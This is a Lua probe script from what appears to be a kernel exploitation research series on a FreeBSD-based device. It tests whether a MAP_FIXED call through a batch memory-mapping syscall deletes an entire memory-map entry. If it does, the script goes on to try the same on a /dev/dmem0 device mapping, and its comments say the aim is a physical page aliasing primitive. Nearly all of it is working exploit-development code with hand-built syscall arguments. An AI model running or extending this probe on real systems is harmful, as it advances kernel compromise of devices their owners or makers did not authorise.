-- CRASH_CLASS: LOW -- the first target is a 64 MiB anonymous mapping this probe creates itself, so
-- deleting it cannot hurt anything. Device targets are only touched if the anon result says the
-- operation is entry scoped.
-- PROBE 1493a: is a MAP_FIXED batch map range scoped or entry scoped?
--
-- 1450a measured a real deviation: munmap(addr, len) removes the WHOLE vm_map_entry containing addr
-- instead of the requested sub-range. The batch map builds its args by hand and calls vm_map
-- directly (0x8b478430), and its flags word is taken from entry+0x08 | 0x1000 - caller controlled.
-- FreeBSD MAP_FIXED is 0x0010, so entry+0x08 = 0x10 asks for MAP_FIXED|MAP_ANON. 1492a showed that
-- without MAP_FIXED the start field is only a hint: op 3 at an occupied address silently allocates
-- somewhere else. With MAP_FIXED the kernel must remove the overlapping range first, and the
-- question is whether that removal inherits the same entry-scoped behaviour munmap has.
--
-- If it does, mapping ONE page inside a large entry deletes the WHOLE entry while the rest of the
-- range keeps whatever the caller still holds: for a device entry that means the physical pages stay
-- with the device while the mapping is gone, and re-mapping returns them to the anonymous allocator.
-- That is a physical page aliasing primitive. This probe only establishes the scope.
--
-- [A] build a 64 MiB anonymous mapping, confirm both ends with 547
-- [B] op 3 with flags 0x10 (MAP_FIXED) at the MIDDLE of that mapping, one page
-- [C] 547 at the start, the middle and the end - a range-scoped map leaves the other two mapped,
--     an entry-scoped map takes all three
-- [D] the same shape on a 16-page /dev/dmem0 mapping, only if [C] shows entry scope
-- [E] op 3 without MAP_FIXED at the same place, as the control that the flag is what changed it
--
-- -- prior art:
--   results/phase36_realargs/1450a_munmap_semantics_20261109_172529.txt (munmap is entry scoped)
--   results/phase36_realargs/1492a_sys548_map_ceiling_20261109_220048.txt (start is a hint without MAP_FIXED)
--   results/phase36_realargs/1488b_sys548_map_desc_20261109_215258.txt (op 3 creates an entry at the hint)

print("=== PROBE 1493a: MAP_FIXED SCOPE IN 548 ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sgn(v)
    local h, l = 0, N(v)
    if type(v) == "table" and v.h then h, l = N(v.h), N(v.l) end
    if (h % 4294967296) == 4294967295 and (l % 4294967296) == 4294967295 then return -1 end
    if h >= 0xFFFF8000 then return -1 end
    return h * 4294967296 + l
end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local ent = memory.alloc(0x40)
local done = memory.alloc(0x10)
local rec = memory.alloc(0x40)

local function map_op3(addr, len, prot, field8)
    for i = 0, 0x38 do pcall(function() memory.write_byte(ent + i, 0) end) end
    pcall(function() memory.write_qword(ent + 0x00, uint64(string.format("0x%X", addr or 0))) end)
    pcall(function() memory.write_qword(ent + 0x08, uint64(string.format("0x%X", field8 or 0))) end)
    pcall(function() memory.write_qword(ent + 0x10, uint64(string.format("0x%X", len))) end)
    pcall(function() memory.write_dword(ent + 0x18, uint64(prot)) end)
    pcall(function() memory.write_byte(ent + 0x1C, 3) end)
    pcall(function() memory.write_dword(done, uint64(0xEEEEEEEE)) end)
    local ok, rv = pcall(function()
        return N(mk(548)(uint64(0), uint64(0), uint64(ent), uint64(1), uint64(done), uint64(0)))
    end)
    if not ok then return "EXC", 0 end
    return rv, N(memory.read_dword(done))
end

local function map547(addr)
    if addr == nil or addr <= 0 then return -1 end
    for i = 0, 0x3C, 4 do pcall(function() memory.write_dword(rec + i, uint64(0)) end) end
    local ok, rv = pcall(function()
        return N(mk(547)(uint64(string.format("0x%X", addr)), uint64(rec), uint64(0), uint64(0), uint64(0), uint64(0)))
    end)
    if not ok or rv ~= 0 then return -1 end
    return N(memory.read_dword(rec + 0x10))
end

-- ---------------------------------------------------------------- [A] the anon target
print("")
print("--- [A] a 64 MiB anonymous mapping ---")
local LEN = 0x4000000
local A = -1
do
    local ok, v = pcall(function()
        return mk(477)(uint64(0), uint64(LEN), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then A = sgn(v) end
end
print(string.format("  mmap 64 MiB -> 0x%X %s", A, A < 0 and es() or ""))
if A < 0x10000 then
    print("  could not build the target; stopping")
    print("=== PROBE 1493a INCOMPLETE ===")
    return
end
-- markers at the three check points
local MID = A + 0x2000000
local END = A + LEN - 0x4000
pcall(function() memory.write_dword(A, uint64(0x1111AAAA)) end)
pcall(function() memory.write_dword(MID, uint64(0x2222BBBB)) end)
pcall(function() memory.write_dword(END, uint64(0x3333CCCC)) end)
print(string.format("  A=0x%X MID=0x%X END=0x%X", A, MID, END))
print(string.format("  547 A=%d MID=%d END=%d", map547(A), map547(MID), map547(END)))

-- ---------------------------------------------------------------- [B] MAP_FIXED in the middle
print("")
print("--- [B] op 3 flags=0x10 (MAP_FIXED|MAP_ANON) at MID, one 16 KiB page ---")
local rv, pr = map_op3(MID, 0x4000, 3, 0x10)
print(string.format("  rv=0x%X processed=%d %s", rv, pr, rv == -1 and es() or ""))

-- ---------------------------------------------------------------- [C] scope
print("")
print("--- [C] 547 at the start, the middle and the end ---")
local pa, pm, pe = map547(A), map547(MID), map547(END)
print(string.format("  A=%d MID=%d END=%d", pa, pm, pe))
if pa == -1 and pe == -1 then
    print("  >>> ENTRY SCOPED: one 16 KiB MAP_FIXED took the whole 64 MiB entry")
elseif pa ~= -1 and pe ~= -1 then
    print("  >>> RANGE SCOPED: the rest of the entry survived")
else
    print("  >>> PARTIAL: one end survived and the other did not")
end
local va, vm, ve = nil, nil, nil
pcall(function() va = N(memory.read_dword(A)) end)
pcall(function() vm = N(memory.read_dword(MID)) end)
pcall(function() ve = N(memory.read_dword(END)) end)
print(string.format("  markers now: A=%s MID=%s END=%s",
    va and string.format("%08X", va) or "fault",
    vm and string.format("%08X", vm) or "fault",
    ve and string.format("%08X", ve) or "fault"))

-- ---------------------------------------------------------------- [D] the device shape, only if entry scoped
print("")
print("--- [D] a 16-page /dev/dmem0 mapping, MAP_FIXED in its middle ---")
if pa ~= -1 or pe ~= -1 then
    print("  skipped: the anon target showed range scope, so there is nothing to escalate")
else
    local path = "/dev/dmem0"
    local pb = memory.alloc(#path + 2)
    for i = 1, #path do pcall(function() memory.write_byte(pb + i - 1, string.byte(path, i)) end) end
    pcall(function() memory.write_byte(pb + #path, 0) end)
    local ok, v = pcall(function() return mk(5)(uint64(pb), uint64(0x4002), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    local fd = ok and sgn(v) or -1
    print(string.format("  dmem0 fd=%d", fd))
    if fd >= 0 then
        local ok2, v2 = pcall(function()
            return mk(477)(uint64(0), uint64(0x40000), uint64(3), uint64(0x1), uint64(fd), uint64(0))
        end)
        local D = ok2 and sgn(v2) or -1
        print(string.format("  mmap 16 pages -> 0x%X", D))
        if D > 0x10000 then
            local dmid = D + 0x20000
            print(string.format("  547 %d/%d/%d", map547(D), map547(dmid), map547(D + 0x3C000)))
            local rv2, pr2 = map_op3(dmid, 0x4000, 3, 0x10)
            print(string.format("  op3 MAP_FIXED at 0x%X -> rv=0x%X processed=%s %s", dmid, rv2, tostring(pr2), rv2 == -1 and es() or ""))
            print(string.format("  547 after: %d/%d/%d", map547(D), map547(dmid), map547(D + 0x3C000)))
        end
    end
end

-- ---------------------------------------------------------------- [E] control, flag off
print("")
print("--- [E] control: op 3 without MAP_FIXED at the same place ---")
do
    local c = sgn(mk(477)(uint64(0), uint64(LEN), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if c > 0x10000 then
        local rv2, pr2 = map_op3(c + 0x1000, 0x4000, 3, 0)
        print(string.format("  fresh 64 MiB at 0x%X, op3 flags=0 at 0x%X -> rv=0x%X (hint ignored when occupied: %s)",
            c, c + 0x1000, rv2, tostring(rv2 ~= c + 0x1000)))
        print(string.format("  547 %d/%d/%d", map547(c), map547(c + 0x3FF0000), -1))
    else
        print("  could not build the control")
    end
end

local final = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print("")
print(string.format("final canary live: %s (pid %d)", tostring(final == PID), PID))
print("=== PROBE 1493a COMPLETE ===")
